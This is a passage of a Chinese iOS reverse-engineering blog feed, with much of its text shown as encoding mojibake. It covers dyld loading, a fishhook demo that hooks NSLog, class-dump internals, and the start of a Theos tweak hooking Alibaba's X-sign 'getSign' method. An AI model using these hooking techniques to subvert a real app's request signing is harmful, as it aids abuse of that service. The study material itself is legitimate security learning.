<li>è¿›å…¥processInitializerså‡½æ•°ï¼Œå…¶ä¸­å¯¹é•œåƒåˆ—è¡¨è°ƒç”¨recursiveInitializationå‡½æ•°è¿›è¡Œé€’å½’å®ä¾‹åŒ–</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld22.jpg" alt=""></p>
<ul>
<li>å…¨å±€æœç´¢recursiveInitializationå‡½æ•°</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld23.jpg" alt=""></p>
<ul>
<li>é¦–å…ˆåˆ†ænotifySingleå‡½æ•°ï¼Œå®šä½åˆ°åŠ è½½image-&gt;getRealPath(), image-&gt;machHeader()çš„sNotifyObjCInit</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld24.jpg" alt=""></p>
<ul>
<li>å…¨å±€æœç´¢sNotifyObjCInitï¼Œæ‰¾åˆ°å…¶èµ‹å€¼æ“ä½œ</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld25.jpg" alt=""></p>
<ul>
<li>æœç´¢registerObjCNotifiersåœ¨å“ªé‡Œè°ƒç”¨äº†ï¼Œå‘ç°åœ¨_dyld_objc_notify_registerè¿›è¡Œäº†è°ƒç”¨</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld26.jpg" alt=""></p>
<ul>
<li>åœ¨dyldæºç ä¸­æœç´¢_dyld_objc_notify_registerå‡½æ•°çš„è°ƒç”¨ç‚¹ï¼Œæ— æ³•æ‰¾åˆ°ï¼Œæˆ‘ä»¬ç”¨ç¬¦å·æ–­ç‚¹çš„æ–¹æ³•å®šä½å…¶è°ƒç”¨</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld27.jpg" alt=""></p>
<ul>
<li>ç¬¦å·æ–­ç‚¹æ–­ä¸‹ä¹‹åï¼Œlldbè¾“å…¥finishå‘½ä»¤ï¼Œå‘ç°æ˜¯objc_initè°ƒç”¨äº†_dyld_objc_notify_registerå‡½æ•°</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld28.jpg" alt=""></p>
<ul>
<li>åœ¨objcæºç ä¸­æœç´¢_dyld_objc_notify_registerçš„è°ƒç”¨ä½ç½®</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld29.jpg" alt=""></p>
<p>-è¿›å…¥load_imageså‡½æ•°ï¼ŒæŸ¥çœ‹loadå‡½æ•°è°ƒç”¨</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld30.jpg" alt=""></p>
<ul>
<li>è¿›å…¥call_load_methodsï¼Œå‘ç°å…¶æ ¸å¿ƒæ˜¯é€šè¿‡do-whileå¾ªç¯è°ƒç”¨+loadæ–¹æ³•</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld31.jpg" alt=""></p>
<ul>
<li>æœ€ç»ˆåœ¨call_class_loadsæ–¹æ³•ä¸­æ‰¾åˆ°äº†è°ƒç”¨loadæ–¹æ³•çš„ä½ç½®</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld32.jpg" alt=""></p>
<ul>
<li>å¦å¤–åœ¨notifySingleæ–¹æ³•ä¸‹é¢ç´§è·Ÿç€doInitializationæ–¹æ³•æ˜¯è°ƒç”¨ç³»ç»ŸC++æ„é€ å‡½æ•°çš„æ–¹æ³•</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld33.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld34.jpg" alt=""></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è‡³æ­¤dyldåŠ è½½mainå‡½æ•°çš„åŸºæœ¬æµç¨‹å¤§è‡´åˆ†æå®Œäº†ï¼Œæœ‰å¹¸æ‰¾äº†ä¸€ä½å¤§ä½¬æ€»ç»“çš„dyldæµç¨‹å›¾åšä¸ªæ€»ç»“</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld.png" alt=""></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.jianshu.com/p/95896fb96a03" target="_blank" rel="external">ä¸çŸ¥MachOæ€æ•¢è¯´è‡ªå·±æ‡‚DYLD</a></p>
<p><a href="https://blog.csdn.net/weixin_40918107/article/details/108815213" target="_blank" rel="external">OCåº•å±‚æ¢ç´¢(åä¸€)dyldæµç¨‹</a></p>
]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>dyld</tag>
      </tags>
  </entry>
  <entry>
    <title>fishhookåŸç†æ¢ç©¶</title>
    <url>/2020/12/23/fishhook%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/</url>
    <content><![CDATA[<p>ä¸Šä¸€ç¯‡æ•´ç†äº†ä¸€ä¸‹MachOæ–‡ä»¶çš„åŸºæœ¬ç»“æ„ï¼Œä½†æ˜¯å¯¹å…¶ä¸»è¦çš„å·¥ä½œåŸç†å¹¶æ²¡æœ‰æ·±ç©¶ï¼Œfishhookæ˜¯iOSå®‰å…¨ä¸­å¸¸è§çš„hookæ¡†æ¶ï¼Œå¯ä»¥é€šè¿‡å¯¹å…¶åŸç†æ¢ç©¶æ›´åŠ æ·±å…¥çš„äº†è§£MachOçš„å·¥ä½œåŸç†ã€‚<br><a id="more"></a></p>
<h1 id="fishhook"><a href="#fishhook" class="headerlink" title="fishhook"></a>fishhook</h1><p>fishHookæ˜¯Facebookæä¾›çš„ä¸€ä¸ªåŠ¨æ€ä¿®æ”¹é“¾æ¥mach-Oæ–‡ä»¶çš„å·¥å…·ã€‚åˆ©ç”¨MachOæ–‡ä»¶åŠ è½½åŸç†ï¼Œé€šè¿‡ä¿®æ”¹æ‡’åŠ è½½è¡¨(Lazy Symbol Pointers)å’Œéæ‡’åŠ è½½è¡¨(Non-Lazy Symbol Pointers)è¿™ä¸¤ä¸ªè¡¨çš„æŒ‡é’ˆè¾¾åˆ°Cå‡½æ•°HOOKçš„ç›®çš„ã€‚</p>
<p>é¦–å…ˆéœ€è¦ä¸‹è½½fishhook<a href="https://github.com/facebook/fishhookw" target="_blank" rel="external">æºç </a>ï¼Œæ–°å»ºé¡¹ç›®ï¼Œå°†å…¶ä¸­çš„fishhook.cå’Œfishhook.hæ–‡ä»¶æ”¾å…¥ç›®å½•ä¸‹ï¼š</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook1.jpg" alt=""></p>
<h2 id="fishhookç®€å•åˆ©ç”¨"><a href="#fishhookç®€å•åˆ©ç”¨" class="headerlink" title="fishhookç®€å•åˆ©ç”¨"></a>fishhookç®€å•åˆ©ç”¨</h2><p>fishhook.hå†…å®¹å¹¶ä¸å¤šï¼Œåªæœ‰ä¸¤ä¸ªæ¥å£å‡½æ•°å’Œä¸€ä¸ªç»“æ„ä½“ï¼Œå…·ä½“å¦‚ä¸‹:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> fishhook_h</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fishhook_h</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined(FISHHOOK_EXPORT)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FISHHOOK_VISIBILITY __attribute__((visibility(<span class="meta-string">"hidden"</span>)))</span></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FISHHOOK_VISIBILITY __attribute__((visibility(<span class="meta-string">"default"</span>)))</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//__cplusplus</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> rebinding &#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">//éœ€è¦HOOKçš„å‡½æ•°åç§°ï¼Œå­—ç¬¦ä¸²</span></div><div class="line">  <span class="keyword">void</span> *replacement; <span class="comment">//æ›¿æ¢åˆ°å“ªä¸ªæ–°çš„å‡½æ•°ä¸Š(æ–°å‡½æ•°åœ°å€)</span></div><div class="line">  <span class="keyword">void</span> **replaced; <span class="comment">//ä¿å­˜åŸå§‹å‡½æ•°æŒ‡é’ˆå˜é‡çš„æŒ‡é’ˆ</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function">FISHHOOK_VISIBILITY</span></div><div class="line"><span class="keyword">int</span> <span class="title">rebind_symbols</span><span class="params">(<span class="keyword">struct</span> rebinding rebindings[], <span class="keyword">size_t</span> rebindings_nel)</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">FISHHOOK_VISIBILITY</span></div><div class="line"><span class="keyword">int</span> <span class="title">rebind_symbols_image</span><span class="params">(<span class="keyword">void</span> *header,</span></div><div class="line">                         <span class="keyword">intptr_t</span> slide,</div><div class="line">                         <span class="keyword">struct</span> rebinding rebindings[],</div><div class="line">                         <span class="keyword">size_t</span> rebindings_nel);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//__cplusplus</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//fishhook_h</span></span></div></pre></td></tr></table></figure>
<p>rebind_symbolså‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥rebindingç»“æ„ä½“æ•°ç»„ï¼Œhookä¸€ä¸ªå‡½æ•°åªéœ€è¦ä¼ å…¥ä¸€ä¸ªrebindingç»“æ„ä½“ï¼Œhookå¤šä¸ªå‡½æ•°åˆ™ä¼ å…¥å¤šä¸ªrebindingç»“æ„ä½“ã€‚</p>
<p>rebindingç»“æ„ä½“å‚æ•°æ„ä¹‰å¦‚ä¸‹ï¼š<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">struct</span> rebinding &#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">//éœ€è¦HOOKçš„å‡½æ•°åç§°ï¼Œå­—ç¬¦ä¸²</span></div><div class="line">  <span class="keyword">void</span> *replacement; <span class="comment">//æ›¿æ¢åˆ°å“ªä¸ªæ–°çš„å‡½æ•°ä¸Š(æ–°å‡½æ•°åœ°å€)</span></div><div class="line">  <span class="keyword">void</span> **replaced; <span class="comment">//ä¿å­˜åŸå§‹å‡½æ•°æŒ‡é’ˆå˜é‡çš„æŒ‡é’ˆ</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>demoçš„ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line">#import "ViewController.h"</div><div class="line">#import "fishhook.h"</div><div class="line"></div><div class="line">@interface ViewController ()</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line">    </div><div class="line">    </div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    //å®šä¹‰rebingdingç»“æ„ä½“</div><div class="line">    struct rebinding nslogBind;</div><div class="line">    //å‡½æ•°åç§°</div><div class="line">    nslogBind.name = "NSLog";</div><div class="line">    //æ–°å‡½æ•°åœ°å€</div><div class="line">    nslogBind.replacement = myNSLog;</div><div class="line">    //ä¿å­˜åŸå§‹å‡½æ•°åœ°å€çš„å˜é‡çš„æŒ‡é’ˆ</div><div class="line">    nslogBind.replaced = (void *)&amp;old_nslog;</div><div class="line">    </div><div class="line">    //æ•°ç»„</div><div class="line">    struct rebinding rebs[] = &#123;nslogBind&#125;;</div><div class="line">  </div><div class="line">    rebind_symbols(rebs, 1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//å‡½æ•°æŒ‡é’ˆï¼Œç”¨æ¥ä¿å­˜åŸå§‹çš„å‡½æ•°çš„åœ°å€</div><div class="line">static void(*old_nslog)(NSString *format, ...);</div><div class="line"></div><div class="line">//æ–°çš„NSLog</div><div class="line">void myNSLog(NSString *format, ...)&#123;</div><div class="line">    format = @"~~å‹¾ä¸Šäº†ï¼\n";</div><div class="line">    //å†è°ƒç”¨åŸæ¥çš„nslog</div><div class="line">    old_nslog(format);</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)touchesBegan:(NSSet&lt;UITouch *&gt; *)touches withEvent:(UIEvent *)event&#123;</div><div class="line">    NSLog(@"ç‚¹å‡»äº†å±å¹•");</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure></p>
<p>è¿è¡Œç‚¹å‡»å±å¹•ï¼Œå°±å¯ä»¥Hook NSLogå‡½æ•°è¾“å‡ºæˆ‘ä»¬è‡ªå·±å®šä¹‰çš„å­—ç¬¦ä¸²ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook2.jpg" alt=""></p>
<h2 id="fishhookåŸç†åˆ†æ"><a href="#fishhookåŸç†åˆ†æ" class="headerlink" title="fishhookåŸç†åˆ†æ"></a>fishhookåŸç†åˆ†æ</h2><p>é¦–å…ˆæœ‰ä¸ªé—®é¢˜éœ€è¦æ€è€ƒï¼Œfishhookä¸ºä»€ä¹ˆå¯ä»¥Hookç³»ç»Ÿçš„Cå‡½æ•°ï¼Œåªæœ‰åŠ¨æ€æ‰æœ‰å¯èƒ½è¢«Hookï¼ŒCå‡½æ•°æ˜¯é™æ€çš„ï¼ŒOCæ˜¯åŠ¨æ€çš„ï¼Œè¿™æ˜¯å› ä¸ºç³»ç»Ÿçš„Cå‡½æ•°æœ‰åŠ¨æ€çš„éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯ç¬¦å·ç»‘å®šçš„è¿‡ç¨‹ã€‚</p>
<p>PICæŠ€æœ¯ï¼ˆä½ç½®ä»£ç ç‹¬ç«‹ï¼‰ï¼šåœ¨æ–‡ä»¶å†…éƒ¨ç”Ÿæˆä¸€ä¸ªè¡¨ï¼Œ å‡½æ•°åç§°ï¼šå‡½æ•°åœ°å€ï¼Œè¿™ç©æ„å°±æ˜¯ç¬¦å·è¡¨<br>å½“MachOç”±dyldåŠ è½½åˆ°å†…å­˜ä¸­æ—¶ï¼Œåœ¨è°ƒç”¨NSLOgæ—¶ï¼Œdyldå°†è¯¥å‡½æ•°åœ°å€èµ‹å€¼åˆ°ç¬¦å·è¡¨å‡½æ•°åœ°å€ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±å«åšç¬¦å·ç»‘å®šã€‚</p>
<p>æˆ‘ä»¬åœ¨ä¹‹å‰çš„ä»£ç åŸºç¡€ä¸Šæ·»åŠ ä¸¤å¥NSLogè¾“å‡º</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook3.jpg" alt=""></p>
<p>å‰é¢çš„NSLogæ˜¯ä¸ºäº†æå‰å°†è¯¥å‡½æ•°è¿›è¡Œç»‘å®šï¼Œä¹Ÿå³æ—¶æ‡’åŠ è½½ç¬¦å·è¡¨ä¸­ï¼Œéæ‡’åŠ è½½ç¬¦å·åœ¨dyldåŠ è½½æ—¶å°±ä¼šç»‘å®šçœŸå®çš„åœ°å€å€¼ï¼Œè€Œæ‡’åŠ è½½ä¸ä¼šï¼Œåªæœ‰ç¬¬ä¸€æ¬¡å»è°ƒç”¨æ‰ä¼šç»‘å®šçœŸå®åœ°å€ï¼Œåœ¨ç¬¬äºŒæ¬¡è°ƒç”¨æ—¶ç›´æ¥ä½¿ç”¨çœŸå®åœ°å€ã€‚</p>
<p>ç¼–è¯‘demoï¼Œä½¿ç”¨MachOViewæŸ¥çœ‹ç¼–è¯‘ç”Ÿæˆçš„MachOæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°NSLogæ˜¯ä½äºæ‡’åŠ è½½ç¬¦å·è¡¨çš„ç¬¬ä¸€ä¸ªï¼Œoffsetä¸º0x8020ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦åœ¨æœ€ä¸Šé¢çš„ä»£ç å†™ä¸€ä¸ªNSLog,æ˜¯ä¸ºäº†å…ˆå®Œæˆç»‘å®šçœŸå®åœ°å€çš„è¿‡ç¨‹ï¼Œä¸‹æ¬¡è°ƒç”¨å°±ä¸ç”¨å†å»ç»‘å®šäº†ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook4.jpg" alt=""></p>
<p>åœ¨rebind_symbolsè°ƒç”¨å¤„ä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•è¾“å…¥å‘½ä»¤image listæŸ¥çœ‹demoè¿è¡Œæ—¶çš„åŸºå€ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook5.jpg" alt=""></p>
<p>ç”¨è·å–åˆ°çš„åŸºå€åŠ ä¸ŠNSLogå‡½æ•°åç§»0x8020ï¼Œmemory readæŸ¥çœ‹å†…å­˜ï¼ŒæŸ¥çœ‹å¯¹åº”å†…å­˜åœ°å€çš„æ±‡ç¼–ä»£ç dis -sï¼Œå‘ç°æ˜¯NSLogçš„å‡½æ•°çœŸå®åœ°å€</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook6.jpg" alt=""></p>
<p>å•æ­¥æ­¥è¿‡rebind_symbols(rebs, 1),å†æ¬¡æŸ¥çœ‹NSLogåç§»ä½ç½®çš„å†…å­˜ï¼Œå‘ç°é‡Œé¢å†™å…¥çš„åœ°å€æœ‰å˜åŒ–ï¼ŒæŸ¥çœ‹å¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œå·²ç»æ›¿æ¢ä¸ºæˆ‘ä»¬è‡ªå·±å†™çš„myNSLogçš„çœŸå®åœ°å€ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook7.jpg" alt=""></p>
<p>é€šè¿‡ä¸Šè¿°çš„è°ƒè¯•è¿‡ç¨‹ï¼Œå¯ä»¥çœ‹å‡ºfishhookå®ç°åŸç†å…¶å®å°±æ˜¯é‡æ–°ç»‘å®šäº†ç¬¦å·è¡¨ï¼Œå°†åŸæœ¬NSLogçš„åœ°å€æ›¿æ¢ä¸ºmyNSLogçš„åœ°å€ã€‚è‡³äºå¦‚ä½•é‡æ–°ç»‘å®šè¿™ä¸ªè¿‡ç¨‹éœ€è¦æ·±å…¥åˆ†æfishhookæºç ï¼Œä¹‹åå•ç‹¬å¼€ä¸€ç¯‡è¿›è¡Œåˆ†æã€‚</p>
<h1 id="class-dumpåŸç†"><a href="#class-dumpåŸç†" class="headerlink" title="class-dumpåŸç†"></a>class-dumpåŸç†</h1><p>class-dumpå¯ä»¥å°†åº”ç”¨çš„å¤´æ–‡ä»¶å¯¼å‡ºï¼Œå¤´æ–‡ä»¶åŒ…å«äº†åº”ç”¨çš„ç±»åå’Œæ–¹æ³•åå¯¹åº”å…³ç³»ï¼Œé€šè¿‡MachOæ–‡ä»¶æ ¼å¼æ¥åˆ†æå…¶åŸç†ã€‚<br>åŒæ ·ä»¥ä¸Šè¿°demoä¸ºä¾‹æ¥æ¢å¯»class-dumpåŸç†ã€‚<br>é¦–å…ˆåœ¨æ•°æ®æ®µä¸­å¯»æ‰¾_objc_classlistèŠ‚ï¼Œè¯¥èŠ‚ä¸­ä¿å­˜äº†ç¨‹åºä¸­æ¯ä¸ªç±»çš„åœ°å€ï¼Œä¸‹å›¾å¯ä»¥çœ‹å‡º0x8158åœ°å€ä¸Šä¿å­˜ç€æ•°æ®0x100008E18,æ”¹åœ°å€ä¿å­˜çš„æ˜¯ç±»AppDelegateçš„ä¿¡æ¯</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook8.jpg" alt=""></p>
<p>32 ä½ç±»ä¿¡æ¯çš„ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_info&#123;</div><div class="line"><span class="keyword">int32_t</span> isa;</div><div class="line"><span class="keyword">int32_t</span> wuperclass;</div><div class="line"><span class="keyword">int32_t</span> cache;</div><div class="line"><span class="keyword">int32_t</span> vtable;</div><div class="line"><span class="keyword">int32_t</span> data;</div><div class="line"><span class="keyword">int32_t</span> reserved1;</div><div class="line"><span class="keyword">int32_t</span> reserved2;</div><div class="line"><span class="keyword">int32_t</span> reserved3;</div><div class="line">&#125;objc_class_info;</div></pre></td></tr></table></figure>
<p>64 ä½çš„ç±»ä¿¡æ¯çš„ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_info_64&#123;</div><div class="line"><span class="keyword">int64_t</span> isa;</div><div class="line"><span class="keyword">int64_t</span> wuperclass;</div><div class="line"><span class="keyword">int64_t</span> cache;</div><div class="line"><span class="keyword">int64_t</span> vtable;</div><div class="line"><span class="keyword">int64_t</span> data;</div><div class="line"><span class="keyword">int64_t</span> reserved1;</div><div class="line"><span class="keyword">int64_t</span> reserved2;</div><div class="line"><span class="keyword">int64_t</span> reserved3;</div><div class="line">&#125;objc_class_info_64;</div></pre></td></tr></table></figure></p>
<p>0x100008E18å±äºæ•°æ®æ®µçš„_objc_dataèŠ‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook9.jpg" alt=""></p>
<p>è¯¥ç±»çš„Dataæ•°æ®æ˜¯0x100008D30ï¼Œå…¶ä¸­ä¿å­˜ç±»çš„æ•°æ®ä¿¡æ¯</p>
<p>32ä½çš„ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_data&#123;</div><div class="line"><span class="keyword">int32_t</span> flags;</div><div class="line"><span class="keyword">int32_t</span> instanceStart;</div><div class="line"><span class="keyword">int32_t</span> instanceSize;</div><div class="line"><span class="keyword">int32_t</span> ivarlayout;</div><div class="line"><span class="keyword">int32_t</span> name;</div><div class="line"><span class="keyword">int32_t</span> baseMethod;</div><div class="line"><span class="keyword">int32_t</span> baseProtocol;</div><div class="line"><span class="keyword">int32_t</span> ivars;</div><div class="line"><span class="keyword">int32_t</span> weakIvarLayout;</div><div class="line"><span class="keyword">int32_t</span> baseProperties;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>64 ä½çš„ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> objc_class_data_64&#123;</div><div class="line"><span class="keyword">int32_t</span> flags;</div><div class="line"><span class="keyword">int32_t</span> instanceStart;</div><div class="line"><span class="keyword">int32_t</span> instanceSize;</div><div class="line"><span class="keyword">int32_t</span> reserved; <span class="comment">//only arm64</span></div><div class="line"><span class="keyword">int64_t</span> ivarlayout;</div><div class="line"><span class="keyword">int64_t</span> name;</div><div class="line"><span class="keyword">int64_t</span> baseMethod;</div><div class="line"><span class="keyword">int64_t</span> baseProtocol;</div><div class="line"><span class="keyword">int64_t</span> ivars;</div><div class="line"><span class="keyword">int64_t</span> weakIvarLayout;</div><div class="line"><span class="keyword">int64_t</span> baseProperties;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>åœ¨æ•°æ®æ®µçš„_objc_constèŠ‚ä¸­æŸ¥çœ‹0x100008D30, è¯¥èŠ‚ä¿å­˜æ˜¯objcå¸¸é‡</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook10.jpg" alt=""></p>
<p>Nameä¸­æ•°æ®åœ°å€ä¸º0x100007711,ä¿å­˜çš„å­—ç¬¦ä¸²ä½äº__objc_classnameèŠ‚ä¸­</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook11.jpg" alt=""></p>
<p>_objc_constèŠ‚ä¸­Base Methodsåœ°å€çš„æ•°æ®æ˜¯0x100008BD0,åœ¨_objc_constèŠ‚å¯»æ‰¾è¯¥åœ°å€ï¼Œè¯¥ç±»ç›¸å…³çš„å‡½æ•°éƒ½åœ¨å…¶ä¸­ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook12.jpg" alt=""></p>
<p>å…¶ä¸­æ–¹æ³•åå¯¹åº”çš„å­—ç¬¦ä¸²ä½äºä»£ç æ®µçš„__objc_methnameèŠ‚ä¸­ã€‚</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>é€šè¿‡fishhookå’Œclass-dumpåŸç†æ¥ç†Ÿæ‚‰MachOæ–‡ä»¶æ ¼å¼ï¼Œåä¹‹é€šè¿‡MachOæ–‡ä»¶æ ¼å¼å»è§£æå„ç§å·¥å…·å®ç°åŸç†ï¼Œæ”¶è·è‰¯å¤š</p>
]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>MachO</tag>
        <tag>hook</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS Theosçš„ä¸€äº›å¿ƒå¾—</title>
    <url>/2020/06/02/iOS-Theos%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<p>ä¹‹å‰åœ¨iOSé€†å‘è¿‡ç¨‹ä¸­ï¼Œå¹¶ä¸å¸¸ç”¨Hookæ–¹å¼å»ååŠ©é€†å‘ï¼Œå¶å°”æœ‰ç”¨ä¹Ÿæ˜¯é€šè¿‡fridaå»å®šä½æ‰“å°ä¸€äº›å›ºå®šç®—æ³•çš„å‚æ•°å’Œç»“æœã€‚åœ¨iOSé€†å‘é¢†åŸŸï¼Œæœ€åŸºç¡€çš„Hookæ–¹å¼æˆ–è€…è¯´å·¥å…·å°±è¦è¯´åˆ°Theosäº†ï¼Œæœ¬ç¯‡ä¸»è¦åˆ†äº«è®°å½•ä¸€ä¸‹æˆ‘åœ¨ä½¿ç”¨Theos Hooké˜¿é‡Œç³»X-signçš„ä¸€äº›å¿ƒå¾—ã€‚</p>
<a id="more"></a>
<h1 id="Theosç®€ä»‹"><a href="#Theosç®€ä»‹" class="headerlink" title="Theosç®€ä»‹"></a>Theosç®€ä»‹</h1><p>Theosæ˜¯ä¸€æ¬¾è·¨å¹³å°çš„è¶Šç‹±å¼€å‘å·¥å…·åŒ…ï¼Œå¯ä»¥åœ¨Winã€Linuxã€MacOSç­‰å¹³å°ä¸‹å·¥ä½œã€‚ç”±äºTheoså®ç°äº†å¯¹Cydia Substraceçš„å°è£…ï¼Œå› è€Œèƒ½å®ç°å¯¹Objective-Cè¿è¡Œæ—¶çš„Hookï¼Œä¹Ÿèƒ½å®ç°å¯¹Cè¯­è¨€å‡½æ•°çš„Hookã€‚iOSå¹³å°ä¸‹çš„Hookæ’ä»¶ä¸»è¦ä¾èµ–äºTheosä¸­çš„Tweakæ’ä»¶ï¼Œå®è´¨å°±æ˜¯iOSå¹³å°çš„åŠ¨æ€åº“ï¼ˆdylibï¼‰ï¼Œåˆ©ç”¨Cydia Substraceæä¾›çš„ç»„ä»¶è¿›è¡ŒåŠ è½½ã€‚<br>è‡³äºå¦‚ä½•å®‰è£…Theosä»¥åŠåˆ›å»ºå·¥ç¨‹è¿™é‡Œå°±ä¸åœ¨ä¸€ä¸€å™è¿°äº†ï¼Œç½‘ä¸Šå¯ä»¥æŸ¥åˆ°çš„èµ„æ–™å®åœ¨å¤ªå¤šã€‚</p>
<h1 id="Tweak-xmç¼–å†™"><a href="#Tweak-xmç¼–å†™" class="headerlink" title="Tweak.xmç¼–å†™"></a>Tweak.xmç¼–å†™</h1><p>â€œ.xmâ€åç¼€è¡¨ç¤ºæºæ–‡ä»¶æ”¯æŒLogoså’ŒC/C++è¯­æ³•ï¼Œå¦‚æœæ˜¯â€.xâ€åç¼€ï¼Œè¯´æ˜æºæ–‡ä»¶ä»…æ”¯æŒLogoså’ŒCè¯­æ³•ã€‚<br>æˆ‘ä»¬çš„Hookä»£ç éƒ½å†™åœ¨è¯¥æ–‡ä»¶å½“ä¸­ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="comment">//å°†è¦Hookçš„ç±»å†™åœ¨%hookä¹‹å</span></div><div class="line">%hook SecurityGuardOpenUnifiedSecurity</div><div class="line"><span class="comment">// éœ€è¦Hookçš„ç±»å’Œå‡½æ•°å†™åœ¨ä¸‹é¢</span></div><div class="line">- (id)getSign:(id)arg1 data:(id)arg2 env:(<span class="keyword">int</span>)arg3 api:(id)arg4&#123;</div><div class="line"><span class="comment">//Logæ‰“å°å‚æ•°å’Œç»“æœ</span></div><div class="line">NSLog(@<span class="string">"-------------Hooked-------------"</span>);</div><div class="line">NSLog(@<span class="string">"----arg1:%@ arg2:%@ arg3:%d arg4:%@-------------"</span>, 